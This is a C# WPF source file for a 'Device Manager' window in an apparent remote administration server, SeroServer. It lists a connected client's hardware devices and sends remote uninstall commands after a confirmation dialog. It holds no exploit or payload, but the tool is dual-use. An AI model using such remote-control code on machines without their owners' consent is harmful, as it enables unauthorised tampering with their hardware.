using System.Collections.ObjectModel;
using System.Windows;
using System.Windows.Controls.Primitives;
using DevExpress.Xpf.Core;
using Newtonsoft.Json;
using SeroServer.Net;
using SeroServer.Protocol;

namespace SeroServer.UI;

public class DeviceEntryVM
{
    public string DeviceId     { get; set; } = "";
    public string Name         { get; set; } = "";
    public string Class        { get; set; } = "";
    public string Status       { get; set; } = "";
    public string Manufacturer { get; set; } = "";
}

public partial class DeviceManagerWindow : ThemedWindow
{
    private readonly TlsServer _server;
    private readonly string    _clientId;
    private readonly ObservableCollection<DeviceEntryVM> _devices = [];

    public DeviceManagerWindow(TlsServer server, string clientId, string label)
    {
        InitializeComponent();
        _server   = server;
        _clientId = clientId;
        TxtTitle.Text = label;
        GridDevs.ItemsSource = _devices;
        RubberBandSelector.Enable(GridDevs);
        _server.RegisterHandler(clientId, PacketType.DevListResult, OnList);
        Lang.LanguageChanged += ApplyLanguage;
        ApplyLanguage();
        Closed += (_, _) =>
        {
            _server.UnregisterHandler(clientId, PacketType.DevListResult);
            Lang.LanguageChanged -= ApplyLanguage;
        };
        Refresh();
    }

    private void ApplyLanguage()
    {
        this.Title = Lang.Get("FEAT_DEVICE_MGR");
        if (MnuDevUninstall != null) MnuDevUninstall.Header = Lang.Get("ACT_UNINSTALL");
        if (MnuDevCopyName  != null) MnuDevCopyName.Header  = Lang.Get("ACT_COPY_NAME");
        if (MnuDevCopyId    != null) MnuDevCopyId.Header    = Lang.Get("ACT_COPY_DEVICE_ID");
        if (MnuDevRefresh   != null) MnuDevRefresh.Header   = Lang.Get("ACT_REFRESH");
        if (ColDevName   != null) ColDevName.Header   = Lang.Get("WIN_COL_NAME");
        if (ColDevClass  != null) ColDevClass.Header  = Lang.Get("WIN_COL_CLASS");
        if (ColDevStatus != null) ColDevStatus.Header = Lang.Get("COL_STATUS");
        if (ColDevManuf  != null) ColDevManuf.Header  = Lang.Get("WIN_COL_MANUFACTURER");
        if (ColDevId     != null) ColDevId.Header     = Lang.Get("WIN_COL_DEVICE_ID");
    }

    private void Refresh() => _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.DevGetList });

    private void OnList(Packet pkt)
    {
        var d = JsonConvert.DeserializeObject<DevListResultData>(pkt.Data);
        if (d == null) return;
        Dispatcher.BeginInvoke(() =>
        {
            _devices.Clear();
            foreach (var dev in d.Devices)
                _devices.Add(new DeviceEntryVM { DeviceId = dev.DeviceId, Name = dev.Name, Class = dev.Class, Status = dev.Status, Manufacturer = dev.Manufacturer });
            TxtCount.Text = $"({d.Devices.Count})";
            TxtStatus.Text = $"Updated {DateTime.Now:HH:mm:ss} — {d.Devices.Count} devices";
        });
    }

    private void BtnUninstall_Click(object s, RoutedEventArgs e)
    {
        if (GridDevs.SelectedItem is not DeviceEntryVM vm) return;
        if (MessageBox.Show($"Uninstall device \"{vm.Name}\"?\nThis will disable the device until it is reconnected.", "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
        _ = _server.SendToClient(_clientId, new Packet { Type = PacketType.DevUninstall, Data = JsonConvert.SerializeObject(new DevUninstallData { DeviceId = vm.DeviceId }) });
        TxtStatus.Text = $"Uninstall sent → {vm.Name}";
        ServerWindow.ReportGlobalActivity("Uninstall device", vm.Name, "complete");
        ServerWindow.LogGlobal($"[DEV] Uninstalled device '{vm.Name}' (ID: {vm.DeviceId}) on client {_clientId}.");
    }

    private void BtnRefresh_Click(object s, RoutedEventArgs e) => Refresh();

    private void GridDevs_CopyName_Click(object s, RoutedEventArgs e)
    {
        if (GridDevs.SelectedItem is DeviceEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.Name); TxtStatus.Text = $"Copied: {vm.Name}"; } catch { }
    }

    private void GridDevs_CopyId_Click(object s, RoutedEventArgs e)
    {
        if (GridDevs.SelectedItem is DeviceEntryVM vm)
            try { System.Windows.Clipboard.SetText(vm.DeviceId); TxtStatus.Text = $"Copied device ID"; } catch { }
    }

    private void Close_Click(object s, RoutedEventArgs e) => Close();

    private void GridDevs_ContextMenuOpening(object sender, System.Windows.Controls.ContextMenuEventArgs e)
    {
        if (GridDevs.SelectedItem == null) e.Handled = true;
    }
}
